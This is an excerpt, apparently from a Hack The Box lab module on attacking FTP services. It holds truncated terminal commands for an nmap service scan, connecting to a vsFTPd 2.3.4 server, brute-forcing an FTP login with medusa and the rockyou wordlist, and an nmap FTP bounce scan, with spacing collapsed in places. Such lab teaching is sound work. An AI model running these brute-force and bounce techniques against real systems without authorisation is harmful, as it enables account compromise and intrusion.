...
```
icantthinkofaname23@htb[/htb]`$sudonmap -sC -sV -p21192.168.2.142Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
...
```
icantthinkofaname23@htb[/htb]`$ftp192.168.2.142Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
...
```
icantthinkofaname23@htb[/htb]`$medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h10.129.203.7 -MftpMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
...
```
icantthinkofaname23@htb[/htb]`$nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213172.17.0.2Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
